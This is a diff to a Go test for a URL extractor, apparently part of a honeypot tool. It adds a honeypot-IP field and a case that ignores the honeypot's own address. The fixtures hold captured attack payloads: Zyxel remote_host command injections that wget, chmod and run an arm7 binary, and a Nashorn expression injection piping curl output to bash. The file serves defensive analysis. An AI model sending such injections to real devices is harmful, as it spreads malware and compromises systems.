@@ -141,31 +141,41 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{"http://www.example.org/"},
 			request: database.Request{
 
-				Uri:  "/ignored?aa=bb",
-				Raw:  "nothing",
-				Body: []byte("dsd http://www.example.org/ fd"),
+				Uri:        "/ignored?aa=bb",
+				Raw:        "nothing",
+				Body:       []byte("dsd http://www.example.org/ fd"),
+				HoneypotIP: "1.1.1.1",
 			},
 		},
-
+		{
+			description: "Ignores honeypot IP",
+			urlsToFind:  []string{},
+			request: database.Request{
+				Uri:        "/ignored?aa=bb",
+				Raw:        "nothing",
+				Body:       []byte("dsd http://1.1.1.1/ fd"),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
 		{
 			description: "Find URL in body (encoded)",
 			urlsToFind:  []string{"http://192.210.162.147/arm7"},
 			request: database.Request{
-
-				Uri:  "/ignored?aa=bb",
-				Raw:  "ssadsa application/x-www-form-urlencoded ds",
-				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+				Uri:        "/ignored?aa=bb",
+				Raw:        "ssadsa application/x-www-form-urlencoded ds",
+				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+				HoneypotIP: "1.1.1.1",
 			},
 		},
-
 		{
 			description: "Find URL in body (not encoded, with semi colon)",
 			urlsToFind:  []string{"http://192.210.162.147/arm7"},
 			request: database.Request{
 
-				Uri:  "/ignored?aa=bb",
-				Raw:  "ssadsads",
-				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+				Uri:        "/ignored?aa=bb",
+				Raw:        "ssadsads",
+				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+				HoneypotIP: "1.1.1.1",
 			},
 		},
 		{
@@ -173,9 +183,10 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{"94.103.87.71/cf.sh"},
 			request: database.Request{
 
-				Uri:  "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
-				Raw:  "ssadsads",
-				Body: []byte(""),
+				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
+				Raw:        "ssadsads",
+				Body:       []byte(""),
+				HoneypotIP: "1.1.1.1",
 			},
 		},
 		{
@@ -183,9 +194,10 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{"http://185.225.73.177/arm7"},
 			request: database.Request{
 
-				Uri:  "/",
-				Raw:  "ssadsads Content-Type: application/x-www-form-urlencoded U",
-				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
+				Uri:        "/",
+				Raw:        "ssadsads Content-Type: application/x-www-form-urlencoded U",
+				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
+				HoneypotIP: "1.1.1.1",
 			},
 		},
 	} {
